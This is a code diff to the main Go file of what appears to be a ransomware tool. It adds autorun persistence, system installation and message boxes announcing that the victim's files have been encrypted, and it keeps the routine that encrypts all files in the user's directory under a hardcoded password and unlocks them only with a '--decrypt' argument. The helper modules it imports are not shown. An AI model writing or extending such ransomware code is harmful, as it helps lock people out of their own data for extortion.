@@ -1,34 +1,51 @@
 package main
 
 import (
-	"os"
+	a "./src/persistence"
 	e "./src/encryption"
 	f "./src/files"
 	i "./src/system"
+	m "./src/messagebox"
 )
 
 func main() {
+	// Password
+	var password      = "password" 
+	// Information
+	var infoEncrypted = "Hello, you files has been encrypted!"
+	// If password is correct
+	var infoDecrypted = "Password is correct, starting decryption..."
+	// If password incorrect
+	var infoWrongPass = "Wrong encryption password!"
 
-	// Settings
-	var password    = "password" // Password
-	var information = "Hello, you files has been encrypted!" // Information
 
-
-
-	// Get '--decrypt' command
-	args := os.Args
+	// Check args
+	args := i.Args()
 	if len(args) > 1 {
+		// If key '--decrypt'
 		if args[1] == "--decrypt" {
 			input_password := args[2]
+			// If password is correct
 			if input_password == password {
+				// Show 'Correct password' message
+				m.MessageBox(0x0, infoDecrypted, "goDecoder", 0x40)
+				// Scan files
 				var Encrypted = f.ScanEncrypted( i.GetUserDir() )
+				// Decrypt files
 				for _, file := range Encrypted {
 					e.DecryptFile(file, password)
 				}
+				// Uninstall autorun
+				a.Uninstall()
+				// Delete decryptor
 				e.DeleteDecryptor()
-				os.Exit(0)
+				// Exit
+				i.Exit(0)
 			} else {
-				os.Exit(1)
+				// Show 'Wrong password' message
+				m.MessageBox(0x0, infoWrongPass, "goDecoder", 0x10)
+				// Exit
+				i.Exit(1)
 			}
 		}
 		
@@ -41,7 +58,14 @@ func main() {
 			e.EncryptFile(file, password)
 		}
 		// Create decryptor file
-		e.CreateDecryptor(information)
-		os.Exit(0)
+		e.CreateDecryptor(infoEncrypted)
+		// Install to system
+		a.InstallToSystem()
+		// Install autorun
+		a.Install()
+		// Show 'information' message
+		m.MessageBox(0x0, infoEncrypted, "goEncoder", 0x30)
+		// Exit
+		i.Exit(0)
 	}
 }
